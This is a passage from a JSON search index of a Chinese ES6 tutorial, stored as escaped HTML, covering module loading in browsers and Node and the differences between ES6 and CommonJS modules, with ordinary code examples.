\u6a21\u5757\u4e5f\u5141\u8bb8\u5185\u5d4c\u5728\u7f51\u9875\u4e2d\uff0c\u8bed\u6cd5\u884c\u4e3a\u4e0e\u52a0\u8f7d\u5916\u90e8\u811a\u672c\u5b8c\u5168\u4e00\u81f4\u3002</p> <pre><code>&lt;script type=\"module\"&gt;\n  import utils from \"./utils.js\";\n\n  // other code\n&lt;/script&gt;\n</code></pre> <p>\u5bf9\u4e8e\u5916\u90e8\u7684\u6a21\u5757\u811a\u672c\uff08\u4e0a\u4f8b\u662f<code>foo.js</code>\uff09\uff0c\u6709\u51e0\u70b9\u9700\u8981\u6ce8\u610f\u3002</p> <ul> <li>\u4ee3\u7801\u662f\u5728\u6a21\u5757\u4f5c\u7528\u57df\u4e4b\u4e2d\u8fd0\u884c\uff0c\u800c\u4e0d\u662f\u5728\u5168\u5c40\u4f5c\u7528\u57df\u8fd0\u884c\u3002\u6a21\u5757\u5185\u90e8\u7684\u9876\u5c42\u53d8\u91cf\uff0c\u5916\u90e8\u4e0d\u53ef\u89c1\u3002</li> <li>\u6a21\u5757\u811a\u672c\u81ea\u52a8\u91c7\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u4e0d\u7ba1\u6709\u6ca1\u6709\u58f0\u660e<code>use strict</code>\u3002</li> <li>\u6a21\u5757\u4e4b\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528<code>import</code>\u547d\u4ee4\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff08<code>.js</code>\u540e\u7f00\u4e0d\u53ef\u7701\u7565\uff0c\u9700\u8981\u63d0\u4f9b\u7edd\u5bf9 URL \u6216\u76f8\u5bf9 URL\uff09\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>export</code>\u547d\u4ee4\u8f93\u51fa\u5bf9\u5916\u63a5\u53e3\u3002</li> <li>\u6a21\u5757\u4e4b\u4e2d\uff0c\u9876\u5c42\u7684<code>this</code>\u5173\u952e\u5b57\u8fd4\u56de<code>undefined</code>\uff0c\u800c\u4e0d\u662f\u6307\u5411<code>window</code>\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6a21\u5757\u9876\u5c42\u4f7f\u7528<code>this</code>\u5173\u952e\u5b57\uff0c\u662f\u65e0\u610f\u4e49\u7684\u3002</li> <li>\u540c\u4e00\u4e2a\u6a21\u5757\u5982\u679c\u52a0\u8f7d\u591a\u6b21\uff0c\u5c06\u53ea\u6267\u884c\u4e00\u6b21\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u6a21\u5757\u3002</p> <pre><code>import utils from 'https://example.com/js/utils.js';\n\nconst x = 1;\n\nconsole.log(x === window.x); //false\nconsole.log(this === undefined); // true\n</code></pre> <p>\u5229\u7528\u9876\u5c42\u7684<code>this</code>\u7b49\u4e8e<code>undefined</code>\u8fd9\u4e2a\u8bed\u6cd5\u70b9\uff0c\u53ef\u4ee5\u4fa6\u6d4b\u5f53\u524d\u4ee3\u7801\u662f\u5426\u5728 ES6 \u6a21\u5757\u4e4b\u4e2d\u3002</p> <pre><code>const isNotModuleScript = this !== undefined;\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#es6-commonjs","title":"ES6 \u6a21\u5757\u4e0e CommonJS \u6a21\u5757\u7684\u5dee\u5f02","text":"<p>\u8ba8\u8bba Node \u52a0\u8f7d ES6 \u6a21\u5757\u4e4b\u524d\uff0c\u5fc5\u987b\u4e86\u89e3 ES6 \u6a21\u5757\u4e0e CommonJS \u6a21\u5757\u5b8c\u5168\u4e0d\u540c\u3002</p> <p>\u5b83\u4eec\u6709\u4e24\u4e2a\u91cd\u5927\u5dee\u5f02\u3002</p> <ul> <li>CommonJS \u6a21\u5757\u8f93\u51fa\u7684\u662f\u4e00\u4e2a\u503c\u7684\u62f7\u8d1d\uff0cES6 \u6a21\u5757\u8f93\u51fa\u7684\u662f\u503c\u7684\u5f15\u7528\u3002</li> <li>CommonJS \u6a21\u5757\u662f\u8fd0\u884c\u65f6\u52a0\u8f7d\uff0cES6 \u6a21\u5757\u662f\u7f16\u8bd1\u65f6\u8f93\u51fa\u63a5\u53e3\u3002</li> </ul> <p>\u7b2c\u4e8c\u4e2a\u5dee\u5f02\u662f\u56e0\u4e3a CommonJS \u52a0\u8f7d\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08\u5373<code>module.exports</code>\u5c5e\u6027\uff09\uff0c\u8be5\u5bf9\u8c61\u53ea\u6709\u5728\u811a\u672c\u8fd0\u884c\u5b8c\u624d\u4f1a\u751f\u6210\u3002\u800c ES6 \u6a21\u5757\u4e0d\u662f\u5bf9\u8c61\uff0c\u5b83\u7684\u5bf9\u5916\u63a5\u53e3\u53ea\u662f\u4e00\u79cd\u9759\u6001\u5b9a\u4e49\uff0c\u5728\u4ee3\u7801\u9759\u6001\u89e3\u6790\u9636\u6bb5\u5c31\u4f1a\u751f\u6210\u3002</p> <p>\u4e0b\u9762\u91cd\u70b9\u89e3\u91ca\u7b2c\u4e00\u4e2a\u5dee\u5f02\u3002</p> <p>CommonJS \u6a21\u5757\u8f93\u51fa\u7684\u662f\u503c\u7684\u62f7\u8d1d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u65e6\u8f93\u51fa\u4e00\u4e2a\u503c\uff0c\u6a21\u5757\u5185\u90e8\u7684\u53d8\u5316\u5c31\u5f71\u54cd\u4e0d\u5230\u8fd9\u4e2a\u503c\u3002\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u6a21\u5757\u6587\u4ef6<code>lib.js</code>\u7684\u4f8b\u5b50\u3002</p> <pre><code>// lib.js\nvar counter = 3;\nfunction incCounter() {\n  counter++;\n}\nmodule.exports = {\n  counter: counter,\n  incCounter: incCounter,\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8f93\u51fa\u5185\u90e8\u53d8\u91cf<code>counter</code>\u548c\u6539\u5199\u8fd9\u4e2a\u53d8\u91cf\u7684\u5185\u90e8\u65b9\u6cd5<code>incCounter</code>\u3002\u7136\u540e\uff0c\u5728<code>main.js</code>\u91cc\u9762\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u3002</p> <pre><code>// main.js\nvar mod = require('./lib');\n\nconsole.log(mod.counter);  // 3\nmod.incCounter();\nconsole.log(mod.counter); // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c<code>lib.js</code>\u6a21\u5757\u52a0\u8f7d\u4ee5\u540e\uff0c\u5b83\u7684\u5185\u90e8\u53d8\u5316\u5c31\u5f71\u54cd\u4e0d\u5230\u8f93\u51fa\u7684<code>mod.counter</code>\u4e86\u3002\u8fd9\u662f\u56e0\u4e3a<code>mod.counter</code>\u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u4f1a\u88ab\u7f13\u5b58\u3002\u9664\u975e\u5199\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u624d\u80fd\u5f97\u5230\u5185\u90e8\u53d8\u52a8\u540e\u7684\u503c\u3002</p> <pre><code>// lib.js\nvar counter = 3;\nfunction incCounter() {\n  counter++;\n}\nmodule.exports = {\n  get counter() {\n    return counter\n  },\n  incCounter: incCounter,\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u51fa\u7684<code>counter</code>\u5c5e\u6027\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u53d6\u503c\u5668\u51fd\u6570\u3002\u73b0\u5728\u518d\u6267\u884c<code>main.js</code>\uff0c\u5c31\u53ef\u4ee5\u6b63\u786e\u8bfb\u53d6\u5185\u90e8\u53d8\u91cf<code>counter</code>\u7684\u53d8\u52a8\u4e86\u3002</p> <pre><code>$ node main.js\n</code></pre> <p>ES6 \u6a21\u5757\u7684\u8fd0\u884c\u673a\u5236\u4e0e CommonJS \u4e0d\u4e00\u6837\u3002JS \u5f15\u64ce\u5bf9\u811a\u672c\u9759\u6001\u5206\u6790\u7684\u65f6\u5019\uff0c\u9047\u5230\u6a21\u5757\u52a0\u8f7d\u547d\u4ee4<code>import</code>\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u53ea\u8bfb\u5f15\u7528\u3002\u7b49\u5230\u811a\u672c\u771f\u6b63\u6267\u884c\u65f6\uff0c\u518d\u6839\u636e\u8fd9\u4e2a\u53ea\u8bfb\u5f15\u7528\uff0c\u5230\u88ab\u52a0\u8f7d\u7684\u90a3\u4e2a\u6a21\u5757\u91cc\u9762\u53bb\u53d6\u503c\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cES6 \u7684<code>import</code>\u6709\u70b9\u50cf Unix \u7cfb\u7edf\u7684\u201c\u7b26\u53f7\u8fde\u63a5\u201d\uff0c\u539f\u59cb\u503c\u53d8\u4e86\uff0c<code>import</code>\u52a0\u8f7d\u7684\u503c\u4e5f\u4f1a\u8ddf\u7740\u53d8\u3002\u56e0\u6b64\uff0cES6 \u6a21\u5757\u662f\u52a8\u6001\u5f15\u7528\uff0c\u5e76\u4e14\u4e0d\u4f1a\u7f13\u5b58\u503c\uff0c\u6a21\u5757\u91cc\u9762\u7684\u53d8\u91cf\u7ed1\u5b9a\u5176\u6240\u5728\u7684\u6a21\u5757\u3002</p> <p>\u8fd8\u662f\u4e3e\u4e0a\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>// lib.js\nexport let counter = 3;\nexport function incCounter() {\n  counter++;\n}\n\n// main.js\nimport { counter, incCounter } from './lib';\nconsole.log(counter); // 3\nincCounter();\nconsole.log(counter); // 4\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0cES6 \u6a21\u5757\u8f93\u5165\u7684\u53d8\u91cf<code>counter</code>\u662f\u6d3b\u7684\uff0c\u5b8c\u5168\u53cd\u5e94\u5176\u6240\u5728\u6a21\u5757<code>lib.js</code>\u5185\u90e8\u7684\u53d8\u5316\u3002</p> <p>\u518d\u4e3e\u4e00\u4e2a\u51fa\u73b0\u5728<code>export</code>\u4e00\u8282\u4e2d\u7684\u4f8b\u5b50\u3002</p> <pre><code>// m1.js\nexport var foo = 'bar';\nsetTimeout(() =&gt; foo = 'baz', 500);\n\n// m2.js\nimport {foo} from './m1.js';\nconsole.log(foo);\nsetTimeout(() =&gt; console.log(foo), 500);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>m1.js</code>\u7684\u53d8\u91cf<code>foo</code>\uff0c\u5728\u521a\u52a0\u8f7d\u65f6\u7b49\u4e8e<code>bar</code>\uff0c\u8fc7\u4e86 500 \u6beb\u79d2\uff0c\u53c8\u53d8\u4e3a\u7b49\u4e8e<code>baz</code>\u3002</p> <p>\u8ba9\u6211\u4eec\u770b\u770b\uff0c<code>m2.js</code>\u80fd\u5426\u6b63\u786e\u8bfb\u53d6\u8fd9\u4e2a\u53d8\u5316\u3002</p> <pre><code>$ babel-node m2.js\n\nbar\nbaz\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0cES6 \u6a21\u5757\u4e0d\u4f1a\u7f13\u5b58\u8fd0\u884c\u7ed3\u679c\uff0c\u800c\u662f\u52a8\u6001\u5730\u53bb\u88ab\u52a0\u8f7d\u7684\u6a21\u5757\u53d6\u503c\uff0c\u5e76\u4e14\u53d8\u91cf\u603b\u662f\u7ed1\u5b9a\u5176\u6240\u5728\u7684\u6a21\u5757\u3002</p> <p>\u7531\u4e8e ES6 \u8f93\u5165\u7684\u6a21\u5757\u53d8\u91cf\uff0c\u53ea\u662f\u4e00\u4e2a\u201c\u7b26\u53f7\u8fde\u63a5\u201d\uff0c\u6240\u4ee5\u8fd9\u4e2a\u53d8\u91cf\u662f\u53ea\u8bfb\u7684\uff0c\u5bf9\u5b83\u8fdb\u884c\u91cd\u65b0\u8d4b\u503c\u4f1a\u62a5\u9519\u3002</p> <pre><code>// lib.js\nexport let obj = {};\n\n// main.js\nimport { obj } from './lib';\n\nobj.prop = 123; // OK\nobj = {}; // TypeError\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>main.js</code>\u4ece<code>lib.js</code>\u8f93\u5165\u53d8\u91cf<code>obj</code>\uff0c\u53ef\u4ee5\u5bf9<code>obj</code>\u6dfb\u52a0\u5c5e\u6027\uff0c\u4f46\u662f\u91cd\u65b0\u8d4b\u503c\u5c31\u4f1a\u62a5\u9519\u3002\u56e0\u4e3a\u53d8\u91cf<code>obj</code>\u6307\u5411\u7684\u5730\u5740\u662f\u53ea\u8bfb\u7684\uff0c\u4e0d\u80fd\u91cd\u65b0\u8d4b\u503c\uff0c\u8fd9\u5c31\u597d\u6bd4<code>main.js</code>\u521b\u9020\u4e86\u4e00\u4e2a\u540d\u4e3a<code>obj</code>\u7684<code>const</code>\u53d8\u91cf\u3002</p> <p>\u6700\u540e\uff0c<code>export</code>\u901a\u8fc7\u63a5\u53e3\uff0c\u8f93\u51fa\u7684\u662f\u540c\u4e00\u4e2a\u503c\u3002\u4e0d\u540c\u7684\u811a\u672c\u52a0\u8f7d\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5f97\u5230\u7684\u90fd\u662f\u540c\u6837\u7684\u5b9e\u4f8b\u3002</p> <pre><code>// mod.js\nfunction C() {\n  this.sum = 0;\n  this.add = function () {\n    this.sum += 1;\n  };\n  this.show = function () {\n    console.log(this.sum);\n  };\n}\n\nexport let c = new C();\n</code></pre> <p>\u4e0a\u9762\u7684\u811a\u672c<code>mod.js</code>\uff0c\u8f93\u51fa\u7684\u662f\u4e00\u4e2a<code>C</code>\u7684\u5b9e\u4f8b\u3002\u4e0d\u540c\u7684\u811a\u672c\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\uff0c\u5f97\u5230\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u5b9e\u4f8b\u3002</p> <pre><code>// x.js\nimport {c} from './mod';\nc.add();\n\n// y.js\nimport {c} from './mod';\nc.show();\n\n// main.js\nimport './x';\nimport './y';\n</code></pre> <p>\u73b0\u5728\u6267\u884c<code>main.js</code>\uff0c\u8f93\u51fa\u7684\u662f<code>1</code>\u3002</p> <pre><code>$ babel-node main.js\n1\n</code></pre> <p>\u8fd9\u5c31\u8bc1\u660e\u4e86<code>x.js</code>\u548c<code>y.js</code>\u52a0\u8f7d\u7684\u90fd\u662f<code>C</code>\u7684\u540c\u4e00\u4e2a\u5b9e\u4f8b\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#node","title":"Node \u52a0\u8f7d","text":""},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_4","title":"\u6982\u8ff0","text":"<p>\u8fd9\u90e8\u5206\u5185\u5bb9\u6682\u65f6\u4e0d\u7528\u5230\uff0c\u4e86\u89e3</p> <p>Node \u5bf9 ES6 \u6a21\u5757\u7684\u5904\u7406\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u4e3a\u5b83\u6709\u81ea\u5df1\u7684 CommonJS \u6a21\u5757\u683c\u5f0f\uff0c\u4e0e ES6 \u6a21\u5757\u683c\u5f0f\u662f\u4e0d\u517c\u5bb9\u7684\u3002\u76ee\u524d\u7684\u89e3\u51b3\u65b9\u6848\u662f\uff0c\u5c06\u4e24\u8005\u5206\u5f00\uff0cES6 \u6a21\u5757\u548c CommonJS \u91c7\u7528\u5404\u81ea\u7684\u52a0\u8f7d\u65b9\u6848\u3002</p> <p>Node \u8981\u6c42 ES6 \u6a21\u5757\u91c7\u7528<code>.mjs</code>\u540e\u7f00\u6587\u4ef6\u540d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u811a\u672c\u6587\u4ef6\u91cc\u9762\u4f7f\u7528<code>import</code>\u6216\u8005<code>export</code>\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u91c7\u7528<code>.mjs</code>\u540e\u7f00\u540d\u3002<code>require</code>\u547d\u4ee4\u4e0d\u80fd\u52a0\u8f7d<code>.mjs</code>\u6587\u4ef6\uff0c\u4f1a\u62a5\u9519\uff0c\u53ea\u6709<code>import</code>\u547d\u4ee4\u624d\u53ef\u4ee5\u52a0\u8f7d<code>.mjs</code>\u6587\u4ef6\u3002\u53cd\u8fc7\u6765\uff0c<code>.mjs</code>\u6587\u4ef6\u91cc\u9762\u4e5f\u4e0d\u80fd\u4f7f\u7528<code>require</code>\u547d\u4ee4\uff0c\u5fc5\u987b\u4f7f\u7528<code>import</code>\u3002</p> <p>\u76ee\u524d\uff0c\u8fd9\u9879\u529f\u80fd\u8fd8\u5728\u8bd5\u9a8c\u9636\u6bb5\u3002\u5b89\u88c5 Node v8.5.0 \u6216\u4ee5\u4e0a\u7248\u672c\uff0c\u8981\u7528<code>--experimental-modules</code>\u53c2\u6570\u624d\u80fd\u6253\u5f00\u8be5\u529f\u80fd\u3002</p> <pre><code>$ node --experimental-modules my-app.mjs\n</code></pre> <p>\u4e3a\u4e86\u4e0e\u6d4f\u89c8\u5668\u7684<code>import</code>\u52a0\u8f7d\u89c4\u5219\u76f8\u540c\uff0cNode \u7684<code>.mjs</code>\u6587\u4ef6\u652f\u6301 URL \u8def\u5f84\u3002</p> <pre><code>import './foo?query=1'; // \u52a0\u8f7d ./foo \u4f20\u5165\u53c2\u6570 ?query=1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u811a\u672c\u8def\u5f84\u5e26\u6709\u53c2\u6570<code>?query=1</code>\uff0cNode \u4f1a\u6309 URL \u89c4\u5219\u89e3\u8bfb\u3002\u540c\u4e00\u4e2a\u811a\u672c\u53ea\u8981\u53c2\u6570\u4e0d\u540c\uff0c\u5c31\u4f1a\u88ab\u52a0\u8f7d\u591a\u6b21\uff0c\u5e76\u4e14\u4fdd\u5b58\u6210\u4e0d\u540c\u7684\u7f13\u5b58\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u53ea\u8981\u6587\u4ef6\u540d\u4e2d\u542b\u6709<code>:</code>\u3001<code>%</code>\u3001<code>#</code>\u3001<code>?</code>\u7b49\u7279\u6b8a\u5b57\u7b26\uff0c\u6700\u597d\u5bf9\u8fd9\u4e9b\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\u3002</p> <p>\u76ee\u524d\uff0cNode \u7684<code>import</code>\u547d\u4ee4\u53ea\u652f\u6301\u52a0\u8f7d\u672c\u5730\u6a21\u5757\uff08<code>file:</code>\u534f\u8bae\uff09\uff0c\u4e0d\u652f\u6301\u52a0\u8f7d\u8fdc\u7a0b\u6a21\u5757\u3002</p> <p>\u5982\u679c\u6a21\u5757\u540d\u4e0d\u542b\u8def\u5f84\uff0c\u90a3\u4e48<code>import</code>\u547d\u4ee4\u4f1a\u53bb<code>node_modules</code>\u76ee\u5f55\u5bfb\u627e\u8fd9\u4e2a\u6a21\u5757\u3002</p> <pre><code>import 'baz';\nimport 'abc/123';\n</code></pre> <p>\u5982\u679c\u6a21\u5757\u540d\u5305\u542b\u8def\u5f84\uff0c\u90a3\u4e48<code>import</code>\u547d\u4ee4\u4f1a\u6309\u7167\u8def\u5f84\u53bb\u5bfb\u627e\u8fd9\u4e2a\u540d\u5b57\u7684\u811a\u672c\u6587\u4ef6\u3002</p> <pre><code>import 'file:///etc/config/app.json';\nimport './foo';\nimport './foo?search';\nimport '../bar';\nimport '/baz';\n</code></pre> <p>\u5982\u679c\u811a\u672c\u6587\u4ef6\u7701\u7565\u4e86\u540e\u7f00\u540d\uff0c\u6bd4\u5982<code>import './foo'</code>\uff0cNode \u4f1a\u4f9d\u6b21\u5c1d\u8bd5\u56db\u4e2a\u540e\u7f00\u540d\uff1a<code>./foo.mjs</code>\u3001<code>./foo.js</code>\u3001<code>./foo.json</code>\u3001<code>./foo.node</code>\u3002\u5982\u679c\u8fd9\u4e9b\u811a\u672c\u6587\u4ef6\u90fd\u4e0d\u5b58\u5728\uff0cNode \u5c31\u4f1a\u53bb\u52a0\u8f7d<code>./foo/package.json</code>\u7684<code>main</code>\u5b57\u6bb5\u6307\u5b9a\u7684\u811a\u672c\u3002\u5982\u679c<code>./foo/package.json</code>\u4e0d\u5b58\u5728\u6216\u8005\u6ca1\u6709<code>main</code>\u5b57\u6bb5\uff0c\u90a3\u4e48\u5c31\u4f1a\u4f9d\u6b21\u52a0\u8f7d<code>./foo/index.mjs</code>\u3001<code>./foo/index.js</code>\u3001<code>./foo/index.json</code>\u3001<code>./foo/index.node</code>\u3002\u5982\u679c\u4ee5\u4e0a\u56db\u4e2a\u6587\u4ef6\u8fd8\u662f\u90fd\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u629b\u51fa\u9519\u8bef\u3002</p> <p>\u6700\u540e\uff0cNode \u7684<code>import</code>\u547d\u4ee4\u662f\u5f02\u6b65\u52a0\u8f7d\uff0c\u8fd9\u4e00\u70b9\u4e0e\u6d4f\u89c8\u5668\u7684\u5904\u7406\u65b9\u6cd5\u76f8\u540c\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_5","title":"\u5185\u90e8\u53d8\u91cf","text":"<p>ES6 \u6a21\u5757\u5e94\u8be5\u662f\u901a\u7528\u7684\uff0c\u540c\u4e00\u4e2a\u6a21\u5757\u4e0d\u7528\u4fee\u6539\uff0c\u5c31\u53ef\u4ee5\u7528\u5728\u6d4f\u89c8\u5668\u73af\u5883\u548c\u670d\u52a1\u5668\u73af\u5883\u3002\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e2a\u76ee\u6807\uff0cNode \u89c4\u5b9a ES6 \u6a21\u5757\u4e4b\u4e2d\u4e0d\u80fd\u4f7f\u7528 CommonJS \u6a21\u5757\u7684\u7279\u6709\u7684\u4e00\u4e9b\u5185\u90e8\u53d8\u91cf\u3002</p> <p>\u9996\u5148\uff0c\u5c31\u662f<code>this</code>\u5173\u952e\u5b57\u3002ES6 \u6a21\u5757\u4e4b\u4e2d\uff0c\u9876\u5c42\u7684<code>this</code>\u6307\u5411<code>undefined</code>\uff1bCommonJS \u6a21\u5757\u7684\u9876\u5c42<code>this</code>\u6307\u5411\u5f53\u524d\u6a21\u5757\uff0c\u8fd9\u662f\u4e24\u8005\u7684\u4e00\u4e2a\u91cd\u5927\u5dee\u5f02\u3002</p> <p>\u5176\u6b21\uff0c\u4ee5\u4e0b\u8fd9\u4e9b\u9876\u5c42\u53d8\u91cf\u5728 ES6 \u6a21\u5757\u4e4b\u4e2d\u90fd\u662f\u4e0d\u5b58\u5728\u7684\u3002</p> <ul> <li><code>arguments</code></li> <li><code>require</code></li> <li><code>module</code></li> <li><code>exports</code></li> <li><code>__filename</code></li> <li><code>__dirname</code></li> </ul> <p>\u5982\u679c\u4f60\u4e00\u5b9a\u8981\u4f7f\u7528\u8fd9\u4e9b\u53d8\u91cf\uff0c\u6709\u4e00\u4e2a\u53d8\u901a\u65b9\u6cd5\uff0c\u5c31\u662f\u5199\u4e00\u4e2a CommonJS \u6a21\u5757\u8f93\u51fa\u8fd9\u4e9b\u53d8\u91cf\uff0c\u7136\u540e\u518d\u7528 ES6 \u6a21\u5757\u52a0\u8f7d\u8fd9\u4e2a CommonJS \u6a21\u5757\u3002\u4f46\u662f\u8fd9\u6837\u4e00\u6765\uff0c\u8be5 ES6 \u6a21\u5757\u5c31\u4e0d\u80fd\u76f4\u63a5\u7528\u4e8e\u6d4f\u89c8\u5668\u73af\u5883\u4e86\uff0c\u6240\u4ee5\u4e0d\u63a8\u8350\u8fd9\u6837\u505a\u3002</p> <pre><code>// expose.js\nmodule.exports = {__dirname};\n\n// use.mjs\nimport expose from './expose.js';\nconst {__dirname} = expose;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>expose.js</code>\u662f\u4e00\u4e2a CommonJS \u6a21\u5757\uff0c\u8f93\u51fa\u53d8\u91cf<code>__dirname</code>\uff0c\u8be5\u53d8\u91cf\u5728 ES6 \u6a21\u5757\u4e4b\u4e2d\u4e0d\u5b58\u5728\u3002ES6 \u6a21\u5757\u52a0\u8f7d<code>expose.js</code>\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230<code>__dirname</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#es6-commonjs_1","title":"ES6 \u6a21\u5757\u52a0\u8f7d CommonJS \u6a21\u5757","text":"<p>CommonJS \u6a21\u5757\u7684\u8f93\u51fa\u90fd\u5b9a\u4e49\u5728<code>module.exports</code>\u8fd9\u4e2a\u5c5e\u6027\u4e0a\u9762\u3002Node \u7684<code>import</code>\u547d\u4ee4\u52a0\u8f7d CommonJS \u6a21\u5757\uff0cNode \u4f1a\u81ea\u52a8\u5c06<code>module.exports</code>\u5c5e\u6027\uff0c\u5f53\u4f5c\u6a21\u5757\u7684\u9ed8\u8ba4\u8f93\u51fa\uff0c\u5373\u7b49\u540c\u4e8e<code>export default xxx</code>\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a CommonJS \u6a21\u5757\u3002</p> <pre><code>// a.js\nmodule.exports = {\n  foo: 'hello',\n  bar: 'world'\n};\n\n// \u7b49\u540c\u4e8e\nexport default {\n  foo: 'hello',\n  bar: 'world'\n};\n</code></pre> <p><code>import</code>\u547d\u4ee4\u52a0\u8f7d\u4e0a\u9762\u7684\u6a21\u5757\uff0c<code>module.exports</code>\u4f1a\u88ab\u89c6\u4e3a\u9ed8\u8ba4\u8f93\u51fa\uff0c\u5373<code>import</code>\u547d\u4ee4\u5b9e\u9645\u4e0a\u8f93\u5165\u7684\u662f\u8fd9\u6837\u4e00\u4e2a\u5bf9\u8c61<code>{ default: module.exports }</code>\u3002</p> <p>\u6240\u4ee5\uff0c\u4e00\u5171\u6709\u4e09\u79cd\u5199\u6cd5\uff0c\u53ef\u4ee5\u62ff\u5230 CommonJS \u6a21\u5757\u7684<code>module.exports</code>\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nimport baz from './a';\n// baz = {foo: 'hello', bar: 'world'};\n\n// \u5199\u6cd5\u4e8c\nimport {default as baz} from './a';\n// baz = {foo: 'hello', bar: 'world'};\n\n// \u5199\u6cd5\u4e09\nimport * as baz from './a';\n// baz = {\n//   get default() {return module.exports;},\n//   get foo() {return this.default.foo}.bind(baz),\n//   get bar() {return this.default.bar}.bind(baz)\n// }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e09\u79cd\u5199\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7<code>baz.default</code>\u62ff\u5230<code>module.exports</code>\u3002<code>foo</code>\u5c5e\u6027\u548c<code>bar</code>\u5c5e\u6027\u5c31\u662f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u62ff\u5230\u4e86<code>module.exports</code>\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002</p> <pre><code>// b.js\nmodule.exports = null;\n\n// es.js\nimport foo from './b';\n// foo = null;\n\nimport * as bar from './b';\n// bar = { default:null };\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>es.js</code>\u91c7\u7528\u7b2c\u4e8c\u79cd\u5199\u6cd5\u65f6\uff0c\u8981\u901a\u8fc7<code>bar.default</code>\u8fd9\u6837\u7684\u5199\u6cd5\uff0c\u624d\u80fd\u62ff\u5230<code>module.exports</code>\u3002</p> <pre><code>// c.js\nmodule.exports = function two() {\n  return 2;\n};\n\n// es.js\nimport foo from './c';\nfoo(); // 2\n\nimport * as bar from './c';\nbar.default(); // 2\nbar(); // throws, bar is not a function\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>bar</code>\u672c\u8eab\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u80fd\u5f53\u4f5c\u51fd\u6570\u8c03\u7528\uff0c\u53ea\u80fd\u901a\u8fc7<code>bar.default</code>\u8c03\u7528\u3002</p> <p>CommonJS \u6a21\u5757\u7684\u8f93\u51fa\u7f13\u5b58\u673a\u5236\uff0c\u5728 ES6 \u52a0\u8f7d\u65b9\u5f0f\u4e0b\u4f9d\u7136\u6709\u6548\u3002</p> <pre><code>// foo.js\nmodule.exports = 123;\nsetTimeout(_ =&gt; module.exports = null);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u4e8e\u52a0\u8f7d<code>foo.js</code>\u7684\u811a\u672c\uff0c<code>module.exports</code>\u5c06\u4e00\u76f4\u662f<code>123</code>\uff0c\u800c\u4e0d\u4f1a\u53d8\u6210<code>null</code>\u3002</p> <p>\u7531\u4e8e ES6 \u6a21\u5757\u662f\u7f16\u8bd1\u65f6\u786e\u5b9a\u8f93\u51fa\u63a5\u53e3\uff0cCommonJS \u6a21\u5757\u662f\u8fd0\u884c\u65f6\u786e\u5b9a\u8f93\u51fa\u63a5\u53e3\uff0c\u6240\u4ee5\u91c7\u7528<code>import</code>\u547d\u4ee4\u52a0\u8f7d CommonJS \u6a21\u5757\u65f6\uff0c\u4e0d\u5141\u8bb8\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>// 